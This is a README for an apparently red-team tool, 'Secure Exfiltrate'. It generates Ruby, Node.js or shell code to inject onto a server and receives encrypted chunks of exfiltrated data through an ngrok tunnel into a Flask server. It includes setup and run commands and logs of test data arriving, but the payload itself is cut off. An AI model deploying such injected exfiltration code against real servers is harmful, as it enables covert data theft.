# Secure Exfiltrate

This project sets up a secure channel that can receive messages from an embedded server. It demonstrates the exfiltration of information by injecting remote code onto a server. However, as a security professional, it ensures that the extracted information is not compromised.

## Prerequisites

Before running this project, make sure you have the following dependencies installed:

- Node.js
- npm
- ngrok (with an account and agent authtoken configured)
- Python 3

## Installation

1. Install the `concurrently` package globally by running the following command:

   ```bash
   npm install -g concurrently
   ```

2. Clone this repository:

   ```bash
   git clone https://github.com/your-username/secure-exfiltrate.git
   ```

3. Navigate to the project directory:

   ```bash
   cd secure_exfiltrate
   ```

4. Install Python dependencies:

   ```bash
   pip install -r requirements.txt
   ```

## Usage

To start the main service and set up the ngrok tunnel:

```bash
make start          # Ruby payload (default)
make start-node     # Node.js payload
make start-shell    # Shell script payload
```

Or run the server directly with `--lang` to choose the exfiltration payload language:

```bash
python3 server.py                    # Ruby (default)
python3 server.py --lang node        # Node.js
python3 server.py --lang ruby        # Ruby
python3 server.py --lang shell       # Shell script (requires jq)
```

Example runtime output with `make start-node` (NOTE: the key is randomly generated each time):

```bash
Starting services with concurrently (Node.js payload)...
Ngrok URL: https://f8d5-98-225-53-234.ngrok-free.app
Code to inject, for safe transmission:
=================================

const crypto = require('crypto');
const https = require('https');
...
```

With `make start` (Ruby, default), the output is Ruby code instead. The server receives and decrypts data the same way regardless of payload language.

The Flask server then runs and shows decrypted chunks as they arrive:

 * Serving Flask app 'server'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:5000
Press CTRL+C to quit
 ==> Decrypted data for message: #jfltbicvcc part 1 (1/2) -> 214 bytes
127.0.0.1 - - [22/Nov/2023 09:43:08] "GET /?n=WPc2Q/46DDoVPX8K5jMEWfDYB4cPdrp/eNMukimma3qh/3uutOsyOJh7CP9H425FKCgsn95%2B1kJHQYW0Zt%2BwoT87hiKxcyS3NTPu6jazF6H9NewDxIumgKKHuS86JjUfEoTZ9EheS3tLu5IVhhEvEDNnzDrttXfuWDCLUTb%2B4UD2smMdo56KAvghKDwXddh776p%2B9cKQqYkTglq/wbpHPhD3JYofjZA4tVgDdTdrDhPnacrj7A%2B37kPdRon51cG6oWzakd8YhxPzRisUHAG2j2pjLl1bBaHIRs1wKeEzbvk8/JhkZCfApPbPu9qug7KYIHjPrjGx62XwTY2kRWSZQw%3D%3D&m=jfltbicvcc&x=0&z=2 HTTP/1.1" 200 -
 ==> Decrypted data for message: #jfltbicvcc part 2 (2/2) -> 146 bytes
Complete message for message ID jfltbicvcc:
=================================
hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world 
=================================

127.0.0.1 - - [22/Nov/2023 09:43:08] "GET /?n=oP/Ia/A9dJUtg13w/B9iur4Rll7XLVldqrXOchry1Nm56AIguLrB6TrrF%2Bhc0Ok9IXxUrcf0lViHQ1FNqMrxVSf1jhtDEayTlITRgRrY2klPo17%2ByK1FJvToBSIfFkk2ruiCy40lMRycLB1s3BF3%2BIFQx9ivOcu5PopHYpa/JFcXjjZfeFsbRChFPjchgzGWdYoK1huLsPwur5KlYLAolCfU8dRNwuDf5MwjnGbi1U2J1bWTo/GGGtjYVGHMOvX3IvdVnh57AVT%2BgfR75LEP8fTK%2BSfOtzWYNSgCJa2DFMvgLUHd6NgQndRfOtokuW/f5RpEs%2BaKaSOE9puLJiJ/dQ%3D%3D&m=jfltbicvcc&x=1&z=2 HTTP/1.1" 200 -
```
